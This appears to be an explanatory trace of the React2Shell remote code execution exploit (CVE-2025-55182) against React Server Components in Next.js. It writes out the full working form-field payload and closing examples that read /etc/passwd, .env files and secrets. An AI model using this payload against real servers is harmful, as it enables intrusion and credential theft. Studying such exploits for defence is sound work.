# React2Shell Payload Walkthrough (CVE-2025-55182)

A step-by-step trace showing exactly how the exploit payload transforms as it flows through the vulnerable code.

---

## The Exploit Payload (Sent as Form Fields)

```javascript
"0" = "$1"
"1" = '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}'
"2" = "$@3"
"3" = "[]"
"4" = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}'
```

---

## Step 1: Request Arrives

### BEFORE

```javascript
// Server state - empty
response._chunks = {}
boundActionArguments = undefined
```

### CODE

```javascript
// packages/next/src/server/app-render/action-handler.ts:879
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)

// Inside decodeReplyFromBusboy, for each form field:
// resolveField(response, name, value) is called
```

### Explanation

The HTTP request arrives with 5 form fields. Each field is stored as a Chunk in the response object. At this point, all values are still raw strings.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "resolved_model",
        value: "$1",
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// decodeReplyFromBusboy returns chunk 0
boundActionArguments = response._chunks[0]
```

---

## Step 2: Chunk 0 is Awaited → Blocks on Chunk 1

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "resolved_model",
        value: "$1",                    // <-- Needs to resolve this
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: null,
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// Server code does:
await boundActionArguments  // boundActionArguments = chunk 0
```

### CODE

```javascript
// JavaScript sees chunk 0 is a thenable (has Chunk.prototype.then)
// It calls: chunk0.then(resolve, reject)

Chunk.prototype.then = function(resolve, reject) {
    const chunk = this;  // chunk = chunk 0

    switch (chunk.status) {
        case "resolved_model":
            initializeModelChunk(chunk);  // Try to parse "$1"
            break;
    }
    // ...
};

// initializeModelChunk calls parseModelString on "$1"
function parseModelString(response, parentObject, key, value) {
    // value = "$1"
    if (value[0] === '$') {
        const refId = parseInt(value.slice(1), 16);  // refId = 1
        return getOrResolveChunk(response, refId);   // Needs chunk 1's VALUE
    }
}

// But chunk 1 is still "resolved_model" (not initialized)!
// So chunk 0 must BLOCK and wait for chunk 1 to resolve first
```

### Explanation

When chunk 0 is awaited, `Chunk.prototype.then` is called. It tries to resolve `"$1"` but chunk 1 isn't initialized yet. Chunk 0 becomes `blocked` and registers a callback on chunk 1 so it gets notified when chunk 1 resolves.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",              // <-- Blocked waiting on chunk 1!
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],      // <-- Callback to wake up chunk 0!
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// Now chunk 1 needs to be resolved before chunk 0 can continue
```

---

## Step 3: Chunk 3 Resolves → Empty Array (No Dependencies)

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",              // Still blocked on chunk 1
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "resolved_model",
        value: "[]",                    // <-- Resolving this first (no dependencies!)
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// The value "[]" is valid JSON with no $ references
const parsed = JSON.parse("[]");  // Returns: []

// No dependencies to wait on, so chunk 3 can initialize immediately
chunk3.value = [];
chunk3.status = "initialized";
```

### Explanation

The string `"[]"` is valid JSON representing an empty array. It has NO `$` references, so it can resolve immediately without blocking. This array is critical because it provides access to the prototype chain.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",          // <-- Now fully resolved!
        value: [],                      // <-- Actual empty array
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,
        _response: response
    }
}

// The prototype chain is now accessible:
// [].constructor === Array
// [].constructor.constructor === Function
```

---

## Step 4: Resolving `$3:constructor:constructor` → Gets Function

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "resolved_model",
        value: '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}',
        reason: null,                   // <-- Resolving "get" property which needs chunk 3
        _response: response
    }
}
```

### CODE

```javascript
// ReactFlightReplyServer.js:595 - getOutlinedModel (VULNERABLE!)
function getOutlinedModel(response, reference, parentObject, key, map) {
    // reference = "3:constructor:constructor"

    const path = reference.split(':');
    // path = ["3", "constructor", "constructor"]

    const id = parseInt(path[0], 16);  // id = 3
    const chunk = getChunk(response, id);

    let value = chunk.value;  // value = []

    // VULNERABILITY: No validation on property names!
    for (let i = 1; i < path.length; i++) {
        value = value[path[i]];
    }
    // Iteration 1: value = []["constructor"] = Array
    // Iteration 2: value = Array["constructor"] = Function

    return map(response, value);  // Returns Function!
}
```

### Explanation

The reference `"$3:constructor:constructor"` means: get chunk 3, then access `.constructor`, then access `.constructor` again. Since chunk 3 is an empty array:
- `[].constructor` is `Array`
- `Array.constructor` is `Function`

The code has no validation, so it happily traverses the prototype chain.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",          // <-- Now resolved!
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function           // <-- THE FUNCTION CONSTRUCTOR!
            },
            _chunks: "$2:_response:_chunks"  // Still needs resolution
        },
        reason: null,
        _response: response
    }
}
```

---

## Step 5: Chunk 2 Resolves → Raw Chunk Reference

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "resolved_model",
        value: "$@3",                   // <-- Resolving this
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    // value = "$@3"

    switch (value[1]) {
        case '@': {
            // "$@" means raw chunk reference (not resolved value)
            const id = parseInt(value.slice(2), 16);  // id = 3
            const chunk = getChunk(response, id);
            return chunk;  // Returns the Chunk OBJECT itself, not chunk.value!
        }
    }
}
```

### Explanation

The `$@` prefix is special. Unlike `$3` which would return the resolved value (`[]`), `$@3` returns the Chunk object itself. This is important because the Chunk object has a `then` method from `Chunk.prototype`.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],
        _response: response
    },
    2: {
        status: "initialized",          // <-- Now resolved!
        value: {                        // <-- Holds the Chunk OBJECT for chunk 3
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            // Inherited from Chunk.prototype:
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}
```

---

## Step 6: Resolving `$2:then` → Gets Chunk.prototype.then

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "resolved_model",
        value: '{"status":"resolved_model","reason":0,"_response":"$4","value":"{\\"then\\":\\"$3:map\\",\\"0\\":{\\"then\\":\\"$B3\\"},\\"length\\":1}","then":"$2:then"}',
        reason: [chunk0_callback],      // <-- Resolving "then" property which needs chunk 2
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: "$2:_response:_chunks"
        },
        reason: null,
        _response: response
    }
}
```

### CODE

```javascript
// getOutlinedModel processes "$2:then"
const path = reference.split(':');
// path = ["2", "then"]

const id = parseInt(path[0], 16);  // id = 2
const chunk = getChunk(response, id);

let value = chunk.value;
// value = { status: "initialized", value: [], ..., then: Chunk.prototype.then }

for (let i = 1; i < path.length; i++) {
    value = value[path[i]];
}
// Iteration 1: value = chunk2.value["then"] = Chunk.prototype.then

return value;  // Returns Chunk.prototype.then!
```

### Explanation

We access the `then` property of chunk 2's value. Since chunk 2 holds a raw Chunk object (from `$@3`), and Chunk objects have a `then` method from their prototype, this returns `Chunk.prototype.then`.

### AFTER

```javascript
response._chunks = {
    0: {
        status: "blocked",
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",          // <-- Now resolved!
        value: {                        // <-- The attacker's fake Chunk object
            status: "resolved_model",
            reason: 0,
            _response: {                // <-- Resolved to chunk 4's value!
                _prefix: "console.log(7*7+1)//",
                _formData: { get: Function },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }  // <-- STOLEN!
        },
        reason: null,                   // Callbacks cleared after calling them
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: response._chunks
        },
        reason: null,
        _response: response
    }
}

// Chunk 1 resolved! Now it calls the callbacks in its reason array
// This wakes up chunk 0!
```

---

## Step 7: Chunk 0 Unblocks → Gets Chunk 1's Value

### BEFORE

```javascript
response._chunks = {
    0: {
        status: "blocked",              // <-- Still blocked, waiting on chunk 1
        value: null,
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: { get: Function },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    // ... chunks 2, 3, 4 all initialized ...
}

// Chunk 1 just resolved - now it calls the callback to wake up chunk 0
```

### CODE

```javascript
// When chunk 1 resolved, it called chunk0_callback
// This callback sets chunk 0's value to chunk 1's value

chunk0.status = "initialized";
chunk0.value = chunk1.value;  // The attacker's fake Chunk object!

// The await on chunk 0 now completes, returning chunk 0's value
// JavaScript sees this value has a "then" property that is a function
// IT'S A THENABLE!
```

### Explanation

Chunk 1's resolution triggers the callback registered in Step 2. Chunk 0 unblocks and its value becomes chunk 1's value - the attacker's fake Chunk object with `then: Chunk.prototype.then`. When JavaScript resolves this thenable, it calls the `then` function!

### AFTER

```javascript
response._chunks = {
    0: {
        status: "initialized",          // <-- Finally resolved!
        value: {                        // <-- Same as chunk 1's value
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: { get: Function },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: { get: Function },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",
        value: {
            status: "initialized",
            value: [],
            reason: null,
            _response: response,
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: response._chunks
        },
        reason: null,
        _response: response
    }
}

// Chunk 0's value is a THENABLE (has "then" function)
// JavaScript will now call chunk0.value.then(resolve, reject)!
```

---

## Step 8: Await Triggers Chunk.prototype.then

### BEFORE

```javascript
// The server awaits the result
await boundActionArguments

// boundActionArguments = chunk 0
// chunk 0's value = chunk 1's value
// chunk 1's value = {
//     status: "resolved_model",
//     reason: 0,
//     _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function }, _chunks: ... },
//     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
//     then: Chunk.prototype.then   <-- HAS A "then" FUNCTION!
// }
```

### CODE

```javascript
// JavaScript sees an object with a "then" function
// It treats it as a thenable and calls:
chunk1Value.then(resolve, reject)

// This invokes Chunk.prototype.then with "this" = chunk1Value
Chunk.prototype.then = function(resolve, reject) {
    const chunk = this;
    // chunk = {
    //     status: "resolved_model",
    //     reason: 0,
    //     _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function } },
    //     value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    //     then: Chunk.prototype.then
    // }

    switch (chunk.status) {
        case "resolved_model":           // This matches!
            initializeModelChunk(chunk);  // <-- CALLED WITH ATTACKER'S OBJECT
            break;
    }
};
```

### Explanation

When JavaScript `await`s an object with a `then` method, it calls that method. Here, `then` is `Chunk.prototype.then`. Because the attacker set `status: "resolved_model"`, it triggers `initializeModelChunk` - but with the attacker's fake `_response`!

### AFTER

```javascript
// initializeModelChunk is called with:
chunk = {
    status: "resolved_model",
    reason: 0,
    _response: {
        _prefix: "console.log(7*7+1)//",
        _formData: {
            get: Function
        },
        _chunks: response._chunks        // Points to real chunks!
    },
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
}

// This will parse chunk.value as JSON and resolve references using chunk._response (FAKE!)
```

---

## Step 9: initializeModelChunk Parses Nested JSON

### BEFORE

```javascript
// Inside initializeModelChunk:
chunk = {
    status: "resolved_model",
    reason: 0,
    _response: {
        _prefix: "console.log(7*7+1)//",
        _formData: {
            get: Function
        },
        _chunks: response._chunks        // Points to real chunks!
    },
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'
}
```

### CODE

```javascript
// ReactFlightReplyServer.js:446 - initializeModelChunk
function initializeModelChunk(chunk) {
    const resolvedModel = chunk.value;
    // resolvedModel = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'

    // Parse the JSON string
    const rawModel = JSON.parse(resolvedModel);
    // rawModel = {
    //     then: "$3:map",
    //     0: { then: "$B3" },
    //     length: 1
    // }

    // Resolve references using chunk._response
    const value = reviveModel(
        chunk._response,   // <-- ATTACKER'S FAKE RESPONSE!
        { '': rawModel },
        '',
        rawModel
    );
}
```

### Explanation

The nested JSON string is parsed, producing an object with references that need resolution. Critically, `reviveModel` uses `chunk._response` - which is the attacker's fake Response containing the Function constructor!

### AFTER

```javascript
// After JSON.parse:
rawModel = {
    then: "$3:map",           // Needs resolution
    0: {
        then: "$B3"           // Needs resolution
    },
    length: 1
}

// reviveModel will resolve these using:
fakeResponse = {
    _prefix: "console.log(7*7+1)//",
    _formData: {
        get: Function
    },
    _chunks: response._chunks    // Points to real chunks!
}
```

---

## Step 10: Resolving `$3:map` → Gets Array.prototype.map

### BEFORE

```javascript
// Currently resolving:
rawModel = {
    then: "$3:map",           // <-- Resolving this
    0: {
        then: "$B3"
    },
    length: 1
}

// Chunk 3 contains:
chunk3 = {
    status: "initialized",
    value: [],                // Empty array
    reason: null,
    _response: response
}
```

### CODE

```javascript
// getOutlinedModel processes "$3:map"
const path = reference.split(':');
// path = ["3", "map"]

const id = parseInt(path[0], 16);  // id = 3
let value = chunks[3].value;       // value = []

for (let i = 1; i < path.length; i++) {
    value = value[path[i]];
}
// Iteration 1: value = []["map"] = Array.prototype.map

return value;  // Returns Array.prototype.map!
```

### Explanation

The path `"3:map"` means "get chunk 3's value, then access its `map` property". Arrays have a `map` method, so this returns `Array.prototype.map`.

### AFTER

```javascript
// After resolving "$3:map":
rawModel = {
    then: function map() { [native code] },  // <-- Array.prototype.map!
    0: {
        then: "$B3"           // Still needs resolution
    },
    length: 1
}

// This object is now THENABLE because "then" is a function!
// When JavaScript resolves it, it will call:
//   rawModel.then(resolve, reject)
// Which is actually:
//   Array.prototype.map.call(rawModel, resolve)
```

---

## Step 11: Outer Thenable Resolves → Array.map Iterates

### BEFORE

```javascript
// The outer object:
outerObject = {
    then: function map() { [native code] },  // Array.prototype.map
    0: {
        then: "$B3"
    },
    length: 1
}
```

### CODE

```javascript
// JavaScript sees "then" is a function, so it calls:
outerObject.then(resolveCallback, rejectCallback)

// This is actually:
Array.prototype.map.call(outerObject, resolveCallback)

// Array.map treats outerObject as array-like because it has:
// - Property "0" (element at index 0)
// - Property "length" (value: 1)

// So map iterates:
for (let i = 0; i < outerObject.length; i++) {
    const item = outerObject[i];
    // i = 0: item = { then: "$B3" }

    const result = resolveCallback(item, i, outerObject);
    // This tries to resolve { then: "$B3" } as a value
}
```

### Explanation

Since `then` is `Array.prototype.map`, calling it iterates over the object. The object has `0: {...}` and `length: 1`, so map processes one item. This item `{then: "$B3"}` needs its `then` property resolved.

### AFTER

```javascript
// Array.map found item at index 0:
innerObject = {
    then: "$B3"               // <-- Needs resolution!
}

// When "$B3" is resolved, it will use the FAKE response:
// fakeResponse._formData.get(fakeResponse._prefix + "3")
// = Function("console.log(7*7+1)//" + "3")
// = Function("console.log(7*7+1)//3")
```

---

## Step 12: Resolving `$B3` → THE RCE TRIGGER!

### BEFORE

```javascript
// Currently resolving:
innerObject = {
    then: "$B3"               // <-- Resolving this
}

// The fake response being used:
fakeResponse = {
    _prefix: "console.log(7*7+1)//",
    _formData: {
        get: Function         // The Function constructor!
    },
    _chunks: response._chunks // Points to real chunks!
}
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    // value = "$B3"
    // response = fakeResponse (attacker controlled!)

    switch (value[1]) {
        case 'B': {
            // "$B" = Blob reference
            const id = parseInt(value.slice(2), 16);
            // id = 3

            const prefix = response._prefix;
            // prefix = "console.log(7*7+1)//"

            const blobKey = prefix + id;
            // blobKey = "console.log(7*7+1)//" + "3"
            // blobKey = "console.log(7*7+1)//3"

            return response._formData.get(blobKey);
            // response._formData.get = Function
            //
            // This call: Function("console.log(7*7+1)//3")
            //
            // Creates: function anonymous() {
            //              console.log(7*7+1)//3
            //          }
        }
    }
}
```

### Explanation

The `$B` prefix normally looks up blob data. It constructs a key from `_prefix + id` and calls `_formData.get(key)`. But the attacker controls both:
- `_prefix` = malicious JavaScript code
- `_formData.get` = the Function constructor

So instead of looking up a blob, it calls `Function("malicious code")`, creating an executable function!

The `//` at the end comments out the appended `3`, keeping the code syntactically valid.

### AFTER

```javascript
// After resolving "$B3":
innerObject = {
    then: function anonymous() {
        console.log(7*7+1)//3
    }
}

// This object is now THENABLE because "then" is a function!
// When JavaScript resolves it, it will CALL this function!
```

---

## Step 13: Inner Thenable Resolves → CODE EXECUTION!

### BEFORE

```javascript
// The inner object:
innerObject = {
    then: function anonymous() {
        console.log(7*7+1)//3
    }
}

// JavaScript sees "then" is a function
// It will call: innerObject.then(resolve, reject)
```

### CODE

```javascript
// JavaScript Promise resolution:
innerObject.then(resolve, reject)

// This CALLS the function:
(function anonymous() {
    console.log(7*7+1)//3
})(resolve, reject)

// The function body executes:
console.log(7*7+1)    // Evaluates to console.log(50)
//3                   // This is just a comment, ignored

// Output: 50
```

### Explanation

JavaScript treats `innerObject` as a thenable and calls its `then` method. But `then` is our malicious function! It executes and runs `console.log(7*7+1)`, printing `50` to the server console.

### AFTER

```javascript
// Server console output:
// 50

// REMOTE CODE EXECUTION ACHIEVED!

// The attacker can replace "console.log(7*7+1)" with anything:
// - require('child_process').execSync('cat /etc/passwd')
// - require('fs').readFileSync('/app/.env')
// - process.env.DATABASE_PASSWORD
// - Reverse shell, data exfiltration, etc.
```

---

## Final State Summary

### All Chunks After Full Resolution

```javascript
response._chunks = {
    0: {
        status: "initialized",
        value: response._chunks[1].value,
        reason: null,
        _response: response
    },
    1: {
        status: "initialized",
        value: {
            status: "resolved_model",
            reason: 0,
            _response: {
                _prefix: "console.log(7*7+1)//",
                _formData: {
                    get: Function
                },
                _chunks: response._chunks
            },
            value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            then: function(resolve, reject) { /* Chunk.prototype.then */ }
        },
        reason: null,
        _response: response
    },
    2: {
        status: "initialized",
        value: response._chunks[3],  // Raw chunk 3 object
        reason: null,
        _response: response
    },
    3: {
        status: "initialized",
        value: [],
        reason: null,
        _response: response
    },
    4: {
        status: "initialized",
        value: {
            _prefix: "console.log(7*7+1)//",
            _formData: {
                get: Function
            },
            _chunks: response._chunks
        },
        reason: null,
        _response: response
    }
}
```

### The Execution Chain

```
HTTP Request with malicious form fields
    ↓
decodeReplyFromBusboy() stores chunks 0-4 (all status: "resolved_model")
    ↓
Returns chunk 0 (thenable - has Chunk.prototype.then)
    ↓
await chunk 0 → calls Chunk.prototype.then
    ↓
Chunk 0 needs chunk 1's VALUE → becomes BLOCKED
    ↓
Registers callback on chunk 1 to wake up chunk 0
    ↓
Dependency resolution begins (bottom-up):
    - Chunk 3 resolves first (no deps) → []
    - Chunk 2 resolves ($@3) → raw Chunk object with .then
    - Chunk 4 resolves ($3:constructor:constructor) → { get: Function }
    - Chunk 1 resolves → fake Chunk with stolen Chunk.prototype.then
    ↓
Chunk 1 resolved → calls chunk 0's callback
    ↓
Chunk 0 unblocks → value = chunk 1's value (fake Chunk object)
    ↓
await returns fake Chunk object (has "then" function)
    ↓
JavaScript sees thenable → calls fakeChunk.then(resolve, reject)
    ↓
Chunk.prototype.then sees status = "resolved_model"
    ↓
Calls initializeModelChunk with FAKE _response!
    ↓
Parses nested JSON: { then: "$3:map", 0: { then: "$B3" }, length: 1 }
    ↓
Resolves "$3:map" → Array.prototype.map
    ↓
Object becomes thenable, JS calls .then() = Array.map
    ↓
map() iterates, finds { then: "$B3" }
    ↓
Resolves "$B3" using FAKE response:
    FAKE._formData.get(FAKE._prefix + "3")
    = Function("console.log(7*7+1)//3")
    ↓
Creates function, object becomes thenable
    ↓
JS calls .then() = malicious function
    ↓
╔═══════════════════════════════════════╗
║  FUNCTION EXECUTES: console.log(50)   ║
║  REMOTE CODE EXECUTION ACHIEVED!      ║
╚═══════════════════════════════════════╝
```
